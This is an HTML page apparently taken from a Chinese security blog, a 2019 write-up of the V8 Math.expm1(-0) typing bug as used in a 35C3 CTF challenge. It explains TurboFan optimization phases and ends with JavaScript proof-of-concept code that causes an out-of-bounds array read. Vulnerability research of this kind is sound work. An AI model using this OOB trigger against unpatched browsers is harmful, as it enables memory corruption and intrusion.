@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>v8-Math.expm1 | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="v8," />
+  
+
+  <meta name="description" content="v8">
+<meta name="keywords" content="v8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="v8-Math.expm1">
+<meta property="og:url" content="http://yoursite.com/2019/08/17/Math.expm1分析/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="v8">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1.png">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567570124(1">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567581427(1">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567586204(1">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567588535(1">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567588714(1">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567588908(1">
+<meta property="og:image" content="http://yoursite.com/Math.expm1/1567590240(1">
+<meta property="og:updated_time" content="2019-09-23T07:20:11.192Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="v8-Math.expm1">
+<meta name="twitter:description" content="v8">
+<meta name="twitter:image" content="http://yoursite.com/Math.expm1/1.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题："><span class="toc-text">问题：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结：-1"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference："><span class="toc-text">Reference：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-Math.expm1分析" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">v8-Math.expm1</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.08.17</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>分析了一下<code>Math.expm1(-0)</code>的<code>OOB</code>的洞，学到了很多，并且也意识到即使一个看起来很小很小，小到可能觉得只是个功能特性问题，并不是一个<code>bug</code>的漏洞，也能够通过一些极其巧妙的方法来达到一个意想不到的漏洞利用。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>相关<code>issue</code>在这里：</p>
+<ol>
+<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></li>
+<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=880207" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=880207</a></li>
+</ol>
+<p>关键的在这里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​</span><br></pre></td></tr></table></figure>
+<p>function foo() {<br>  return Object.is(Math.expm1(-0), -0);<br>}</p>
+<p>console.log(foo());<br>%OptimizeFunctionOnNextCall(foo);<br>console.log(foo());<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ ./d8 --allow-natives-syntax expm1-poc.js</span><br><span class="line">true</span><br><span class="line">false</span><br></pre></td></tr></table></figure></p>
+<p>可能乍一看，也就是一个特性问题，正不正确的其实也没多大关系..漏洞发现者开始也是这么觉得的..但是后来他才发现这个漏洞是完全可利用的<code>RCE</code>。该漏洞修复了两次，第一次官方只<code>patch</code>了一个文件<code>operation-typer.cc</code>，后面又<code>patch</code>了<code>typer.cc</code>文件。<code>patch</code>记录可以参考如下：</p>
+<ol>
+<li><a href="https://chromium.googlesource.com/v8/v8.git/+/76df2c50d0e37ab0c42d0d05a637afe999fffc49" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/76df2c50d0e37ab0c42d0d05a637afe999fffc49</a></li>
+<li><a href="https://chromium.googlesource.com/v8/v8.git/+/56f7dda67fdc9777719f71225494033f03aecc96" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/56f7dda67fdc9777719f71225494033f03aecc96</a></li>
+</ol>
+<p>这里就拿<code>35C3</code>上的题来说，作者拿了他发现的这个洞去出了题，出的是只打了<code>operation-typer.cc</code>没有打<code>typer.cc</code>的题。现在我们直接来分析一下，先看看两个<code>patch</code>：</p>
+<p><code>operation-typer.cc</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> Type OperationTyper::NumberExpm1(Type type) &#123;</span><br><span class="line">   DCHECK(type.Is(Type::Number()));</span><br><span class="line">-  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());</span><br><span class="line">+  return Type::Number();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Type OperationTyper::NumberFloor(Type type) &#123;</span><br></pre></td></tr></table></figure>
+<p><code>typer.cc</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@@ -1433,7 +1433,6 @@</span><br><span class="line">     // Unary math functions.</span><br><span class="line">     case BuiltinFunctionId::kMathAbs:</span><br><span class="line">     case BuiltinFunctionId::kMathExp:</span><br><span class="line">-    case BuiltinFunctionId::kMathExpm1:</span><br><span class="line">       return Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());</span><br><span class="line">     case BuiltinFunctionId::kMathAcos:</span><br><span class="line">     case BuiltinFunctionId::kMathAcosh:</span><br><span class="line">@@ -1443,6 +1442,7 @@</span><br><span class="line">     case BuiltinFunctionId::kMathAtanh:</span><br><span class="line">     case BuiltinFunctionId::kMathCbrt:</span><br><span class="line">     case BuiltinFunctionId::kMathCos:</span><br><span class="line">+    case BuiltinFunctionId::kMathExpm1:</span><br><span class="line">     case BuiltinFunctionId::kMathFround:</span><br><span class="line">     case BuiltinFunctionId::kMathLog:</span><br><span class="line">     case BuiltinFunctionId::kMathLog1p:</span><br></pre></td></tr></table></figure>
+<p>需要说明的是这时候的<code>CheckBounds</code>检查还是可以消除的。</p>
+<p>从<code>patch</code>来看修改了<code>MathExpm1</code>的<code>type</code>类型，本来是<code>PlainNumber加NaN</code>类型的，现在修改成了<code>Number</code>类型。<code>PlainNumber</code>类型表示除-0之外的任何浮点数，但是这是在<code>TurboFan</code>当中的，实际不优化过程是被当作浮点数的，浮点数是包括<code>-0</code>的。所以这就产生了错误。</p>
+<p>当我们直接运行<code>Poc</code>的话，仍然会得到一样的结果，我们先看看IR显示结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function test(x)&#123;</span><br><span class="line">	var b = Object.is(Math.expm1(x),-0);</span><br><span class="line">	return b;         //a[b * 4];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0));</span><br><span class="line">for (var i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">	test(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0));</span><br></pre></td></tr></table></figure>
+<p><img src="/Math.expm1/1.png" alt="1"></p>
+<p>这里直接显示了<code>Number</code>类型，原因是他打了<code>operation-typer.cc</code>的补丁，导致<code>TurboFan</code>猜测类型结果为<code>Number</code>类型，所以导致后面可真也可假，不会触发<code>bug</code>。那我们要怎么去利用<code>typer.cc</code>没有打上的<code>patch</code>呢？我们首先得知道<code>typer.cc</code>上<code>JSCallTyper</code>函数是拿来用在内置函数优化上的，而不是<code>NumberExpm1</code>上的，<code>OperationTyper::NumberExpm1</code>是用在普通优化<code>Math.expm1</code>函数上的。所以我们需要利用内置函数上的<code>bug</code>去触发，那么我们该怎么去触发<code>Math.expm1</code>出现在内置函数的优化上呢，这就需要去优化了：</p>
+<p>该函数<code>Math.expm1</code>是数字输入的优化结点，也就是说<code>TurboFan</code>推测该函数输入将会是一个数字。如果运行的确实是一个数字的话，那么它就继续执行代码，但是如果不是一个数字，优化函数将会把不是一个数字的结果反馈给解释器，那么会执行一个“去优化”，此时解释器将会使用内置函数，他可以接受所有的类型。下次编译之后，<code>TurboFan</code>会有反馈信息通知他输入的并不总是数字，从而会产生内置函数的调用，而不是<code>NumberExpm1</code>的调用。</p>
+<p>修改一下代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function test(x)&#123;</span><br><span class="line">	var b = Object.is(Math.expm1(x),-0);</span><br><span class="line">	return b;         //a[b * 4];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0));</span><br><span class="line">for (var i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">	test(&quot;1&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0));</span><br></pre></td></tr></table></figure>
+<p>此时再看IR会发现有两个文件，其中一个是正常<code>NumberExpm1</code>优化，另一个就是内置函数的优化了，得到了一个<code>Call</code>结点：</p>
+<p><img src="/Math.expm1/1567570124(1" alt="1567570124(1)">.jpg)</p>
+<p>加上<code>--trace-deopt</code>来查看一下去优化的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[deoptimizing (DEOPT eager): begin 0x1bddfbb9df21 &lt;JSFunction test (sfi = 0x1bddfbb9dc71)&gt; (opt #0) @0, FP to SP delta: 24, caller sp: 0x7ffe301a06c0]</span><br><span class="line">            ;;; deoptimize at &lt;./exp.js:2:25&gt;, not a Number or Oddball</span><br><span class="line">  reading FeedbackVector (slot 8)</span><br><span class="line">  reading input frame test =&gt; bytecode_offset=0, args=2, height=6, retval=0(#0); inputs:</span><br><span class="line">      0: 0x1bddfbb9df21 ;  [fp -  16]  0x1bddfbb9df21 &lt;JSFunction test (sfi = 0x1bddfbb9dc71)&gt;</span><br><span class="line">      1: 0x234d92701521 ;  [fp +  24]  0x234d92701521 &lt;JSGlobal Object&gt;</span><br><span class="line">      2: 0x28603cd042c9 ; rax 0x28603cd042c9 &lt;String[1]: 1&gt;</span><br><span class="line">      3: 0x1bddfbb81749 ;  [fp -  24]  0x1bddfbb81749 &lt;NativeContext[249]&gt;</span><br><span class="line">      4: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt;</span><br><span class="line">      5: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt;</span><br><span class="line">      6: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt;</span><br><span class="line">      7: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt;</span><br><span class="line">      8: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt;</span><br><span class="line">      9: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt;</span><br><span class="line">  translating interpreted frame test =&gt; bytecode_offset=0, height=48</span><br><span class="line">    0x7ffe301a06b8: [top + 104] &lt;- 0x234d92701521 &lt;JSGlobal Object&gt; ;  stack parameter (input #1)</span><br><span class="line">    0x7ffe301a06b0: [top +  96] &lt;- 0x28603cd042c9 &lt;String[1]: 1&gt; ;  stack parameter (input #2)</span><br><span class="line">    -------------------------</span><br><span class="line">    0x7ffe301a06a8: [top +  88] &lt;- 0x563b96976ef5 ;  caller&apos;s pc</span><br><span class="line">    0x7ffe301a06a0: [top +  80] &lt;- 0x7ffe301a0710 ;  caller&apos;s fp</span><br><span class="line">    0x7ffe301a0698: [top +  72] &lt;- 0x1bddfbb81749 &lt;NativeContext[249]&gt; ;  context (input #3)</span><br><span class="line">    0x7ffe301a0690: [top +  64] &lt;- 0x1bddfbb9df21 &lt;JSFunction test (sfi = 0x1bddfbb9dc71)&gt; ;  function (input #0)</span><br><span class="line">    0x7ffe301a0688: [top +  56] &lt;- 0x1bddfbb9e079 &lt;BytecodeArray[43]&gt; ;  bytecode array</span><br><span class="line">    0x7ffe301a0680: [top +  48] &lt;- 0x003900000000 &lt;Smi 57&gt; ;  bytecode offset</span><br><span class="line">    -------------------------</span><br><span class="line">    0x7ffe301a0678: [top +  40] &lt;- 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #4)</span><br><span class="line">    0x7ffe301a0670: [top +  32] &lt;- 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #5)</span><br><span class="line">    0x7ffe301a0668: [top +  24] &lt;- 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #6)</span><br><span class="line">    0x7ffe301a0660: [top +  16] &lt;- 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #7)</span><br><span class="line">    0x7ffe301a0658: [top +   8] &lt;- 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt; ;  stack parameter (input #8)</span><br><span class="line">    0x7ffe301a0650: [top +   0] &lt;- 0x28603cd00e19 &lt;Odd Oddball: optimized_out&gt; ;  accumulator (input #9)</span><br><span class="line">[deoptimizing (eager): end 0x1bddfbb9df21 &lt;JSFunction test (sfi = 0x1bddfbb9dc71)&gt; @0 =&gt; node=0, pc=0x563b969772c0, caller sp=0x7ffe301a06c0, took 0.129 ms]</span><br><span class="line">Feedback updated from deoptimization at &lt;./exp.js:2:25&gt;, not a Number or Oddball</span><br></pre></td></tr></table></figure>
+<p>可以看见一些<code>not a Number or Oddball</code>的信息，说明跟编译器推测的<code>Number</code>类型不一样，从而发生了去优化，此时编译器在结点处猜测的类型为<code>PlainNumber|NaN</code>，已经达到了我们所期望的结果了。</p>
+<p><strong>整个过程其实就是编译器先运行假设输入为<code>Number</code>类型，当类型反馈告诉编译器此时的输入是一个字符串时，<code>TurboFan</code>此时就会去优化，第二次编译该函数时，会调用输入可以为任何类型的内置函数来进行优化。达到期望效果。</strong></p>
+<p><strong>总体来说，<code>TurboFan</code>是根据类型反馈<code>FeedBack</code>来工作的，还有一个点是“预测”。就是反馈和预测相结合来工作的。</strong></p>
+<p>接下来要考虑的就是该如何去触发<code>OOB</code>的访问了。</p>
+<p>先测试如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function test(x)&#123;</span><br><span class="line">	var a = [1.1,2.2,3.3,4.4];</span><br><span class="line">	var b = Object.is(Math.expm1(x),-0);</span><br><span class="line">	return a[b*4];         //a[b * 4];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">	test(&quot;1&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0));</span><br></pre></td></tr></table></figure>
+<p>直接看<code>simplified lowering</code>阶段的<code>IR</code>：</p>
+<p><img src="/Math.expm1/1567581427(1" alt="1567581427(1)">.jpg)</p>
+<p>可以发现这里被折叠为直接取了数组的第零位。往前看看被折叠的最初始位置。</p>
+<p>最开始可以在<code>typer</code>阶段就可以看见，<code>typer</code>阶段的<code>SameValue</code>结点就已经折叠为<code>false</code>了，后面自然就直接取<code>index</code>为0了。具体可以看<code>operation-typer.cc</code>的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Type OperationTyper::SameValue(Type lhs, Type rhs) &#123;</span><br><span class="line">  if (!JSType(lhs).Maybe(JSType(rhs))) return singleton_false();</span><br><span class="line">  if (lhs.Is(Type::NaN())) &#123;</span><br><span class="line">    if (rhs.Is(Type::NaN())) return singleton_true();</span><br><span class="line">    if (!rhs.Maybe(Type::NaN())) return singleton_false();</span><br><span class="line">  &#125; else if (rhs.Is(Type::NaN())) &#123;</span><br><span class="line">    if (!lhs.Maybe(Type::NaN())) return singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  if (lhs.Is(Type::MinusZero())) &#123;</span><br><span class="line">    if (rhs.Is(Type::MinusZero())) return singleton_true();</span><br><span class="line">    if (!rhs.Maybe(Type::MinusZero())) return singleton_false();</span><br><span class="line">  &#125; else if (rhs.Is(Type::MinusZero())) &#123;</span><br><span class="line">    if (!lhs.Maybe(Type::MinusZero())) return singleton_false();      --&gt; fold false</span><br><span class="line">  &#125;                                    // hit here</span><br><span class="line">  if (lhs.Is(Type::OrderedNumber()) &amp;&amp; rhs.Is(Type::OrderedNumber()) &amp;&amp;</span><br><span class="line">      (lhs.Max() &lt; rhs.Min() || lhs.Min() &gt; rhs.Max())) &#123;</span><br><span class="line">    return singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  return Type::Boolean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以我们需要改变一下代码形式，使得<code>SameValue</code>在该阶段不被折叠，也就是不被“发现就可以了”。</p>
+<p>根据代码，我们有两种方式，第一种为使得左分支可能为<code>-0</code>，第二种为使得右分支不为<code>-0</code>。因为第一种是固定不能变的，所以我们只能从第二种方式下手，我们得把<code>-0</code>右分支替换掉。</p>
+<p>先试试这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function test(x,y)&#123;</span><br><span class="line">	var a = [1.1,2.2,3.3,4.4];</span><br><span class="line">	var b = Object.is(Math.expm1(x),y);</span><br><span class="line">	return a[b*4];         //a[b * 4];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">	test(&quot;1&quot;,-0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0,-0));</span><br></pre></td></tr></table></figure>
+<p>这时候虽然<code>SameValue</code>结点会保留下来，但是到了<code>simplified lowering</code>阶段的时候无法消除<code>CheckBounds</code>，这样最终也是无法利用的，后面可以发现<code>y</code>作为第二个参数<code>Parameter[2]</code>结点为<code>NotInternal</code>类型，该类型表示编译器不知道<code>y</code>的类型，也就是说，<code>y</code>也可以是<code>-0</code>，那么<code>SameValue</code>可真也可假，导致最后<code>CheckBounds</code>结点无法消除。</p>
+<p>这点得去好好研究一下<code>TurboFan</code>的<code>pipeline</code>运行机制。此处引用一个作者的图来表示<code>pipeline</code>管道优化的大概流程：</p>
+<p><img src="/Math.expm1/1567586204(1" alt="1567586204(1)">.jpg)</p>
+<p><a href="https://cs.chromium.org/chromium/src/v8/src/compiler/typed-optimization.cc?cl=c59c9c46b589deb2a41ba07cf87275921b8b2885&amp;l=494" target="_blank" rel="noopener">typed-optimizitaion</a>阶段会简化<code>SameValue</code>结点，可以简化为<code>ObjectIsMinusZero</code>结点，<a href="https://cs.chromium.org/chromium/src/v8/src/compiler/simplified-lowering.cc?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&amp;l=3079" target="_blank" rel="noopener">simpified-lowering</a>阶段会简化<code>ObjectIsMinusZero</code>结点，会直接将他折叠为<code>false</code>常量。</p>
+<p><strong>又上面可知我们不希望在<code>typer</code>阶段就被折叠为<code>false</code>，也不希望<code>CheckBounds</code>无法消除，那我们就需要将<code>SameValue</code>结点保留到<code>simpified-lowering</code>阶段，让这个阶段知道在和<code>-0</code>比较，从而折叠为<code>false</code>消除<code>CheckBounds</code>结点。</strong></p>
+<p><strong>也就是需要绕过<code>typer-lowering</code>阶段稳定到<code>simplified-lowering</code>阶段。</strong></p>
+<p>这时候我们可以用一下逃逸分析（<code>escape-analysis</code>），代码改为如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function test(x)&#123;</span><br><span class="line">	var a = [1.1,2.2,3.3,4.4];</span><br><span class="line">	var c = &#123;x:-0&#125;;</span><br><span class="line">	var b = Object.is(Math.expm1(x),c.x);</span><br><span class="line">	return a[b*4];         //a[b * 4];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">	test(&quot;1&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test(-0));</span><br></pre></td></tr></table></figure>
+<p>逃逸分析阶段的作用就是简化非逃逸对象，什么叫非逃逸对象呢。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">	var a = &#123;x:1&#125;;</span><br><span class="line">	return a.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时<code>a</code>就叫非逃逸对象，因为他的<code>x</code>属性值是固定不可变的，也就是说可以将<code>a.x</code>直接折叠为<code>1</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(x)&#123;</span><br><span class="line">	x.x = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test()&#123;</span><br><span class="line">	var a = &#123;x:1&#125;;</span><br><span class="line">	escape(a);</span><br><span class="line">	return a.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时<code>a</code>是逃逸对象，<strong>也就是说逃脱了<code>test</code>的范围</strong>，因此就无法优化折叠了。</p>
+<p>此时我们用以上更改过的代码跑之后就可以得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.2741325538412e-310</span><br></pre></td></tr></table></figure>
+<p>显然我们已经成功<code>OOB</code>了。还不够，此时我们再来看看<code>IR</code>图。</p>
+<p><code>typer</code>阶段：</p>
+<p><img src="/Math.expm1/1567588535(1" alt="1567588535(1)">.jpg)</p>
+<p>显然已经不会被直接折叠为<code>false</code>。</p>
+<p><code>typed-lowering</code>阶段：</p>
+<p><img src="/Math.expm1/1567588714(1" alt="1567588714(1)">.jpg)</p>
+<p>没有被简化为<code>ObjectIsMinusZero</code>结点。</p>
+<p><code>escape-analysis</code>阶段：</p>
+<p><img src="/Math.expm1/1567588908(1" alt="1567588908(1)">.jpg)</p>
+<p>此时<code>SameValue</code>右结点被折叠为<code>-0</code>。</p>
+<p><code>simpified-lowering</code>阶段：</p>
+<p><img src="/Math.expm1/1567590240(1" alt="1567590240(1)">.jpg)</p>
+<p>此时<code>checkbounds</code>结点被消除了。</p>
+<p>所以<code>SameValue</code>结点一直存活到了最后一个简化阶段。</p>
+<p>这题目其实也可以先考虑“逃逸分析”后考虑“去优化”，也会发现一些有趣的东西，比如在十万次循环中写上的是<code>&quot;-0&quot;</code>，那么还会多出一个<code>NumberLessThan</code>结点等等，这就自行分析了不多说。分析到最后还是可以发现一些<code>TurboFan</code>很奇怪的地方的。</p>
